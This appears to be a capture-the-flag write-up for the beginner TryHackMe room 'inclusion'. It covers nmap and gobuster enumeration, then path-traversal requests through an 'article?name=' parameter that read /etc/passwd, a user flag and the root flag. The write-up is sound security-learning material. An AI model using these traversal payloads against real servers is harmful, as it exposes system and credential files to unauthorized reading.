---
title: "THM:inclusion"
subtitle: "TryHackMe CTF room: https://tryhackme.com/room/inclusion"
categories: [ctf, thm]
tags: [ctf,nmap,gobuster,dirbuster,lfi,local-file-inclusion]
---
# inclusion

URL: [https://tryhackme.com/room/inclusion](https://tryhackme.com/room/inclusion) &nbsp;<span class="badge rounded-pill bg-success" title="This is an Easy difficulty room."><i class="fa fa-bolt"></i>&nbsp;Easy</span>

## PHASE 1: Reconnaissance

Description of the room:

> This is a beginner level room designed for people who want to get familiar with Local file inclusion vulnerability.
>  
> If you have any kind of feedback please reach out to me on twitter at [0xmzfr](https://twitter.com/0xmzfr)

## PHASE 2: Scanning & Enumeration

### Running: `nmap`

Ran the following:

> `nmap -sC -sV xxx.xxx.xxx.xxx`

Interesting ports found to be open:

```python
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

*Also see: [nmap.log](nmap.log)*

### Running: `gobuster`

Ran the following:
> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://xxx.xxx.xxx.xxx`

Interesting folders found:

```python
/article              (Status: 500) [Size: 290]
```

*See also: [gobuster.log](gobuster.log)*

## PHASE 3: Gaining Access

What we discover is there is only one folder on this server (that is `/article`) and as a `name` argument, it seems to take a file name.

So, we go back, back, back up a few directories to see if we can get the web server to print out the contents of other interesting files on the server.

### STEP 1: Find usernames

> http://10.10.110.200/article?name=../../../../etc/passwd

### STEP 2: Get unprivileged user flag

> http://10.10.110.200/article?name=../../../../home/falconfeast/user.txt

### STEP 3: Get root flag

> http://10.10.110.200/article?name=../../../../root/root.txt

By using this technique, we were able to get a value username (`falconfeast`) and read the `user.txt` file, and also step into the `/root` folder to read the `root.txt` file. The contents of those files were the two flags for this room.

## PHASE 4: Maintaining Access

We never got direct access to this box, so no access to maintain.

## PHASE 5: Clearing Tracks

We never had direct access. Nothing to do.

## Summary

Completed: [2022-01-19 21:50:56]